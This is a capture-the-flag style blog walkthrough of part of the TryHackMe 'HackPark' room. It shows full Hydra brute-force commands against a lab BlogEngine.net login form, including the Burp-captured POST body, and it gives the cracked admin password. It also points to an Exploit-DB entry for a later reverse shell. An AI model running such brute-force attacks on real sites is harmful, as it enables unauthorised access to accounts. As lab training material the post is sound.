---
title: THM Room Walkthrough - HackPark
date: '2025-01-23 19:34:56 +0000'
author: b3rdma
categories:
  - Hacking
  - Try Hack Me
tags:
  - hydra
  - enumeration
  - exploit-db
  - burp suite
description: Part one of the THM room HackPark walkthrough.
---
# Part 1

## Contents

### Table of contents

<!-- toc -->

- [Task 1 - Deploy the Machine](#task-1---deploy-the-machine)
  * [To scan or not to scan...](#to-scan-or-not-to-scan)
  * [Reverse-Image Search](#reverse-image-search)
- [Task 2 - Using Hydra to Brute-Force a login](#task-2---using-hydra-to-brute-force-a-login)
  * [BurpSuite to the rescue](#burpsuite-to-the-rescue)
- [Task 3 - Compromise the machine](#task-3---compromise-the-machine)
- [Task 4 - Windows Privilege Escalation](#task-4---windows-privilege-escalation)

<!-- tocstop -->

## Task 1 - Deploy the Machine

### To scan or not to scan...

Simple first task here; deploy the machine and answer a question about the
clown. The question asks who is the clown on the homepage so I took a 'gamble'
and entered the target ip address direct in to the browser _without_ performing
an `nmap` scan first.

### Reverse-Image Search

It paid off as I went straight to homepage of the site and saw the clown from
the **IT** film. To answer the question of who he is, I saved the image and did
a google reverse-image search and found the name is _Pennywise_; I should really
have known that but it's been a while since I seen the film and it's good
practice to do a reverse image search. On to task 2.

## Task 2 - Using Hydra to Brute-Force a login

I had a few issues running the Hydra command as it's been a while since I used
it and there were no entries in the results from `history | rg hydra`. First few
commands were along the lines of:

```bash
hydra -l admin -P rockyou.txt 10.10.5.178 http-post-form
"/Account/login.aspx:username=^USER^&password=^PASS^:F=AdminStatus"
```

If the fail part of the above command (`F=AdminStatus`) is not accurate, Hydra
will return a default of 16 correct passwords, all of which are actually
incorrect. This is because Hydra is not seeing the failed login condition and
therefore stops at 16 '_successful_' attempts.

### BurpSuite to the rescue

I cracked open BurpSuite and enabled the proxy intercept. Going to the login
page and adding _admin_ and _password_ to the fields, clicking the login button
and seeing the actual submit data, I was not surprised that Hydra was having
trouble. So, the actual data being sent in the POST request is as follows:

```html
__VIEWSTATE=WOnPg3iFnDFsh2GWZ0Bg2xnaOwQfKyJ9XMttcsvYjKp95LUHYTGIT%2Bu7WMtLtiVssQYi0Qj%2FvEQXZukNxlR45PVnKkEXe83uwXAgnSxUIw4tHkOPl03E%2BBjrh2evMXJ4on5bFBpTvSGGwQAawZUHWIhzJirukfvmZSysNFuxLCLxnngnEvkHc0aorbzi1n4Wj108uXc%2BWeryeW4vrfpXhnTcC5tISIGhvT1iTEnWkPC4sVEbkaBPmW3Scnz1B8HS7RaX%2FiMBqK20mK9b5w28VQWogog2cariWCJKhPq5rxFwFwGlkg6qF4TVob4TYggPjTazciOcpFeiop2y2SyT3QdaP%2B%2BIOCPY%2BRf4w9peYS1o8VT9&__EVENTVALIDATION=1mN%2BUGQZVTLoa7qjhhisVpdMl0tPwQyM7T6L08nsPNwbJ%2FotrHfQ4wA1Lh%2BvTtpfBGwPVp1evCEmyFFKzZ0St1lyriBj9zhg9uyX9OOKG6AXp%2FUp6OayJoPIva3S8ATrTWCw6D06wEX6oIJtXc3cAlQjhKJDLDLXhwlh368sfqqYYiYK&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login
failed
```

It is this huge amount of code that needs to be included in the Hydra command.
This is typically something along the lines of
`unsername=admin&password=password123` but not in this case!
Note in the above data I have already replaced the `Password=password` with the
Hydra version, `Password=^PASS^`. The full Hydra command that produces the
result is:

```bash
hydra -l admin -P rockyou.txt 10.10.5.178 http-post-form
"/Account/login.aspx:__VIEWSTATE=WOnPg3iFnDFsh2GWZ0Bg2xnaOwQfKyJ9XMttcsvYjKp95LUHYTGIT%2Bu7WMtLtiVssQYi0Qj%2FvEQXZukNxlR45PVnKkEXe83uwXAgnSxUIw4tHkOPl03E%2BBjrh2evMXJ4on5bFBpTvSGGwQAawZUHWIhzJirukfvmZSysNFuxLCLxnngnEvkHc0aorbzi1n4Wj108uXc%2BWeryeW4vrfpXhnTcC5tISIGhvT1iTEnWkPC4sVEbkaBPmW3Scnz1B8HS7RaX%2FiMBqK20mK9b5w28VQWogog2cariWCJKhPq5rxFwFwGlkg6qF4TVob4TYggPjTazciOcpFeiop2y2SyT3QdaP%2B%2BIOCPY%2BRf4w9peYS1o8VT9&__EVENTVALIDATION=1mN%2BUGQZVTLoa7qjhhisVpdMl0tPwQyM7T6L08nsPNwbJ%2FotrHfQ4wA1Lh%2BvTtpfBGwPVp1evCEmyFFKzZ0St1lyriBj9zhg9uyX9OOKG6AXp%2FUp6OayJoPIva3S8ATrTWCw6D06wEX6oIJtXc3cAlQjhKJDLDLXhwlh368sfqqYYiYK&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login
failed"
```

Quite the mouthful eh.

Success with Hydra informing us that `login: admin` and `password: 1qaz2wsx` are
working. On to Task 3.

## Task 3 - Compromise the machine

First question is found after logging in and clicking on the about link on the
left. Too easy.

In this section, the answer to question 3 is also there and is labeled
_Identity:_ so not hard to find either.

> Technically speaking, we're supposed to answer this question _after_ we get
> access to the machine and not from this part. I think it was just lucky that
> the answer was displayed on the about page.
> {: .prompt-warning}

The answer to question 2 is found by searching for '_blogengine.net_' on
[Exploit-DB](https://www.exploit-db.com/exploits/46353) and making sure you find
the exploit for the version of blogengine.net as applicable.

Although that is all the questions answered for Task 3, we still need to run the
exploit on the machine to get ourselves a reverse shell.

That is Task 3 complete, now on to Task 4. I will run the exploit and start Task
4 soon.

## Task 4 - Windows Privilege Escalation

To be continued in Part 2 when I get the time to spin up the room again. Watch
this space...

